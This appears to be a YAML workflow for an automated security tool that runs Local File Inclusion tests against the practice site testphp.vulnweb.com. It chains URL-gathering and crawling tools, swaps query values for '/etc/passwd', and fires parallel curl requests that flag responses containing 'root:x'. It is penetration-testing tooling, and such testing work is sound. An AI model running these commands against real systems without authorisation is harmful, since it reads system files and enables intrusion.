description: Executes a Local File Inclusion (LFI) vulnerability test against 'testphp.vulnweb.com'. It starts by using 'gau' to gather URLs from the specified target, then filters those URLs for potential LFI vulnerabilities using 'gf'. Each URL is tested by attempting to replace a query string with the path "/etc/passwd" using 'qsreplace', followed by a 'curl' request to each modified URL. If the response contains the string "root:x", indicating that the /etc/passwd file has been successfully included (a clear sign of an LFI vulnerability), the URL is marked as vulnerable. This process is parallelized across 25 threads for efficiency.
tags: lfi, security, bash, curl
params: target=testphp.vulnweb.com, header="Example:Blackdagger"
# Change header without blank if you need or add authorization
env:
  - HOME: /root/
  - LOG_DIR: ${HOME}/logs
  - PATH: /usr/local/bin:${PATH}
steps:
  - name: CustomLFI-External
    command: bash
    script: |
      gau ${target//\"} | gf lfi | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %" || true' 
  - name: CustomLFI-Internal
    command: bash
    script: |
      ~/go/bin/httpx -u ${target//\"} | katana -H "$header" qurl | gf lfi | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %" || true' 
  - name: AutoLFI
    command: bash
    script: |
      ~/go/bin/httpx -u $target -o resLFI_${target//\"}.txt ; wapiti -u "$(cat resLFI_${target//\"}.txt)" -m file -H "$header"